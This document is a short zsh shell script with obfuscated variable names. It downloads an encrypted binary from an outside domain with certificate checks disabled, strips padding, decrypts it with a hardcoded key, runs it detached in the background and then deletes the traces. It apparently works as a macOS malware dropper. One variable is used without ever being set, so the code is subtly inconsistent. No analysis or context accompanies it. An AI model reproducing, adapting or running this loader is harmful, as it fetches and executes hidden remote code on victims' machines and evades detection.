#!/bin/zsh
bwnef=$(mktemp /tmp/sesvg7.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m33814f43ea1d83d2.bin" -o "$bwnefz" || exit 1
bvp5jt=$(stat -f %z "$bwnefz"); y3zturx=$(( bvp5jt - 1844 - 3670 ))
tail -c +$(( 1844 + 1 )) "$bwnefz" | head -c $y3zturx | openssl enc -d -aes-256-cbc -k 66812b56db2ad2b0cb600a95 -out "$bwnef" 2>/dev/null
[ -s "$bwnef" ] && chmod 700 "$bwnef" && ( "$bwnef" & ) && disown
( sleep 3; rm -f "$bwnef" "$bwnefz" ) &>/dev/null &
